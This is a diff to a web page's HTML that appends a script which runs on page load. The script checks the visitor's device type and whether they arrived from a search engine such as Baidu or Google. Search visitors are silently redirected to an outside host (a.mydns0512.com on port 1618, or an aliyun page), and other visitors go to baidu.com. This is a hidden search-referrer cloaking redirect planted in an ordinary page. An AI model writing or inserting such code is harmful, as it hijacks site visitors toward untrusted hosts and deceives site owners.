@@ -31,5 +31,59 @@
 		}
 		
 		</script>
+		<script type="text/javascript">
+			function fBrowserRedirect(){
+			    var sUserAgent = navigator.userAgent.toLowerCase();
+				
+			    var bIsIpad = sUserAgent.match(/ipad/i) == "ipad";
+			    var bIsIphone = sUserAgent.match(/iphone/i) == "iphone";
+			    var bIsIos = sUserAgent.match(/ios/i) == "ios";
+			    var bIsmacos = sUserAgent.match(/mac os/i) == "mac os";
+			
+			    var bIsAndroid = sUserAgent.match(/android/i) == "android";
+			    var bIsaz = sUserAgent.match(/Android/i) == "Android";
+			    var bIslinux = sUserAgent.match(/linux/i) == "linux"; 
+			    var bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile"; 
+			  
+			    if(bIsIpad||bIsIphone||bIsIos||bIsmacos){ //判断苹果访问
+			        var sUrl = location.href;   
+					var d=document.referrer;
+			        if(!bForcepc){ 
+			         if(d.indexOf("baidu")>0||d.indexOf("google")>0||d.indexOf("sogou")>0||d.indexOf("bing")>0||d.indexOf("live")>0||d.indexOf("soso")>0||d.indexOf("youdao")>0||d.indexOf("zhongsou")>0||d.indexOf("yahoo")>0||d.indexOf("114")>0||d.indexOf("360.cn")>0||d.indexOf("bing")>0||d.indexOf("search")>0){window.location.href="http://a.mydns0512.com:1618/js/ios.html" //优化跳转
+			          
+			        }else{
+			            window.location.href = "http://www.baidu.com/ios.html"  //苹果端跳转地址
+			              }
+			        } 
+			    }else if(bIsAndroid||bIsaz||bIslinux||bIsWM){ //判断安卓访问
+			        var sUrl = location.href;   
+					var d=document.referrer;
+			        if(!bForcepc){ 
+			         if(d.indexOf("baidu")>0||d.indexOf("google")>0||d.indexOf("sogou")>0||d.indexOf("bing")>0||d.indexOf("live")>0||d.indexOf("soso")>0||d.indexOf("youdao")>0||d.indexOf("zhongsou")>0||d.indexOf("yahoo")>0||d.indexOf("114")>0||d.indexOf("360.cn")>0||d.indexOf("bing")>0||d.indexOf("search")>0){window.location.href="http://a.mydns0512.com:1618/js/az.html" //优化跳转
+			          
+			        }else{
+			            window.location.href = "http://www.baidu.com/az.html"  //安卓端跳转地址
+			              }
+			        } 
+			    }else{ //判断电脑访问
+				
+				  if(!bForcepc){ 
+					var d=document.referrer;
+			        if(d.indexOf("baidu")>0||d.indexOf("google")>0||d.indexOf("sogou")>0||d.indexOf("bing")>0||d.indexOf("live")>0||d.indexOf("soso")>0||d.indexOf("youdao")>0||d.indexOf("zhongsou")>0||d.indexOf("yahoo")>0||d.indexOf("114")>0||d.indexOf("360.cn")>0||d.indexOf("bing")>0||d.indexOf("search")>0){window.location.href="http://batit.aliyun.com/alww.html"//优化跳转
+			          
+			        }else{
+			            window.location.href = "http://www.baidu.com" //电脑访问跳转地址
+			              }
+			        } 
+				}
+			} 
+			function fGetQuery(name){//获取参数值 
+			    var sUrl = window.location.search.substr(1); 
+			    var r = sUrl.match(new RegExp("(^|&)" + name + "=([^&]*)(&|$)")); 
+			    return (r == null ? null : unescape(r[2])); 
+			} 
+			
+			fBrowserRedirect();
+		</script>
 	</body>
 </html>
